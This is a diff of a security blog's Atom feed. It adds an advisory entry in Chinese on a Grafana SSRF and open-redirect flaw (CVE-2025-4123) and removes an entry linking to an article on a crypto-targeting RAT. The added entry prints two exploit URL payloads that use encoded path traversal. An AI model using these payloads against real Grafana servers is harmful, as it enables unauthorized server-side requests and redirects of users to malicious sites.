@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-21T14:45:14.388Z</updated>
+  <updated>2025-06-21T15:15:12.650Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Grafana 服务端请求伪造漏洞</title>
+    <link href="http://example.com/2025/06/21/github_2664599926/"/>
+    <id>http://example.com/2025/06/21/github_2664599926/</id>
+    <published>2025-06-21T15:15:12.650Z</published>
+    <updated>2025-06-21T15:15:12.650Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Grafana 服务端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4123</li></ul><p><strong>漏洞类型：</strong> 服务端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Grafana存在服务端请求伪造（SSRF）漏洞，攻击者可以通过构造特定的URL请求，利用该漏洞进行未授权的服务端请求。此外，还存在开放重定向漏洞，攻击者可以构造特定的URL路径，将用户重定向到恶意网站。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>来源：</strong> <a href="https://github.com/punitdarji/Grafana-cve-2025-4123">https://github.com/punitdarji/Grafana-cve-2025-4123</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>docker-compose.yml</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Grafana-cve-2025-4123"><a href="#Grafana-cve-2025-4123" class="headerlink" title="Grafana-cve-2025-4123"></a>Grafana-cve-2025-4123</h2><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">3000</span>/render/public/..%<span class="hljs-number">252</span>f%<span class="hljs-number">255</span>C&#123;&#123;OpenRedirectURL&#125;&#125;%<span class="hljs-number">252</span>f%<span class="hljs-number">253</span>F%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..<br></code></pre></td></tr></table></figure><h4 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/public/..<span class="hljs-variable">%2</span>F<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>&#123;website.com&#125;<span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>f<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana 服务端请求伪造漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="服务端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
+    
+  </entry>
   
   <entry>
     <title>Tomcat 反序列化漏洞</title>
@@ -525,33 +552,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="Z1Sec" scheme="http://example.com/tags/Z1Sec/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Chollima 黑客利用新的 GolangGhost RAT 针对币圈</title>
-    <link href="http://example.com/2025/06/21/weixin_1297893821/"/>
-    <id>http://example.com/2025/06/21/weixin_1297893821/</id>
-    <published>2025-06-21T12:13:07.420Z</published>
-    <updated>2025-06-21T12:13:07.417Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/MLRwl0t4jUBGunwYZ39ylQ">https://mp.weixin.qq.com/s/MLRwl0t4jUBGunwYZ39ylQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/MLRwl0t4jUBGunwYZ39ylQ&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
